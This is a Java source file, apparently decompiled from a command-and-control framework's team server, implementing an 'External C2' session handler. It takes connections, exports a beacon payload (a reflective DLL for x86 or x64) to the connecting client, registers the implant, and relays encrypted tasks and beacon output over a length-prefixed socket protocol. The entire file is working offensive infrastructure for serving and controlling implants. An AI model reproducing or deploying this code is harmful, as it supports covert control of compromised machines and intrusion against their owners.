package extc2;

import beacon.BeaconC2;
import beacon.BeaconSetup;
import common.BeaconEntry;
import common.BeaconOutput;
import common.CommonUtils;
import common.MudgeSanity;
import common.ScListener;
import dialog.DialogUtils;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;

public class ExternalC2Session implements Runnable {
   protected Socket client;
   protected BeaconSetup setup = null;
   protected BeaconC2 controller = null;
   protected InputStream in = null;
   protected OutputStream out = null;
   protected Map options = new HashMap();
   protected Set valid = CommonUtils.toSet("arch, type, pipename, block");
   protected byte[] metadata = new byte[0];
   protected ScListener listener = null;

   protected void defaults() {
      this.options.put("block", "100");
      this.options.put("arch", "x86");
      this.options.put("type", "rdll");
      this.options.put("pipename", "externalc2");
   }

   public ExternalC2Session(BeaconSetup var1, ScListener var2, Socket var3) {
      this.client = var3;
      this.setup = var1;
      this.controller = var1.getController();
      this.listener = var2;
      this.defaults();
      (new Thread(this, "External C2 client")).start();
   }

   private byte[] Read4() throws IOException {
      byte[] var1 = new byte[4];
      int var2 = this.in.read(var1);
      if (var2 != 4) {
         throw new IOException("Read expected 4 byte length, read: " + var2);
      } else {
         int var3 = CommonUtils.toIntLittleEndian(var1);
         if (var3 >= 0 && var3 <= 4194304) {
            byte[] var4 = new byte[var3];

            for(int var5 = 0; var5 < var3; var5 += var2) {
               var2 = this.in.read(var4, var5, var3 - var5);
            }

            return var4;
         } else {
            throw new IOException("Read size is odd: " + var3);
         }
      }
   }

   private void Write4(byte[] var1) throws IOException {
      byte[] var2 = new byte[8];
      ByteBuffer var3 = ByteBuffer.wrap(var2);
      var3.order(ByteOrder.LITTLE_ENDIAN);
      var3.putInt(var1.length);
      this.out.write(var2, 0, 4);
      this.out.flush();
      this.out.write(var1, 0, var1.length);
      this.out.flush();
   }

   public void setupIO() throws IOException {
      this.in = new BufferedInputStream(this.client.getInputStream(), 2097152);
      this.out = new BufferedOutputStream(this.client.getOutputStream(), 262144);
   }

   public void run() {
      String var1 = "";

      try {
         this.setupIO();

         while(true) {
            String var9 = CommonUtils.bString(this.Read4());
            if ("go".equals(var9)) {
               var9 = DialogUtils.string(this.options, "arch");
               String var10 = DialogUtils.string(this.options, "pipename");
               if (!"x64".equals(var9) && !"x86".equals(var9)) {
                  CommonUtils.print_error("Invalid arch");
                  this.Write4(new byte[0]);
               } else {
                  byte[] var4 = this.setup.getExternalC2(var10).export(var9);
                  this.Write4(var4);
               }

               this.metadata = CommonUtils.shift(this.Read4(), 4);
               var1 = this.controller.process_beacon_metadata(this.listener, (String)null, this.metadata).getId();

               while(true) {
                  long var11 = System.currentTimeMillis() + (long)DialogUtils.number(this.options, "block");

                  byte[] var6;
                  for(var6 = this.controller.dump(var1, 921600, 1048576); var6.length == 0 && System.currentTimeMillis() < var11; var6 = this.controller.dump(var1, 921600, 1048576)) {
                     CommonUtils.sleep(100L);
                  }

                  this.controller.process_beacon_metadata(this.listener, (String)null, this.metadata);
                  byte[] var7;
                  if (var6.length > 0) {
                     var7 = this.controller.getSymmetricCrypto().encrypt(var1, var6);
                     this.Write4(var7);
                  } else {
                     this.Write4(new byte[1]);
                  }

                  var7 = this.Read4();
                  if (var7.length != 1) {
                     this.controller.process_beacon_data(var1, var7);
                  }

                  CommonUtils.sleep(100L);
               }
            }

            String[] var3 = CommonUtils.toKeyValue(var9);
            if (this.valid.contains(var3[0])) {
               this.options.put(var3[0], var3[1]);
            }
         }
      } catch (Exception var8) {
         MudgeSanity.logException("External C2 session", var8, false);
         this.controller.getCheckinListener().output(BeaconOutput.Output(var1, CommonUtils.session(var1) + " connection lost."));
         this.controller.getResources().archive(BeaconOutput.Activity(var1, CommonUtils.session(var1) + " connection lost."));
         BeaconEntry var2 = this.controller.getCheckinListener().resolve(var1);
         if (var2 != null) {
            var2.die();
         }

      }
   }
}
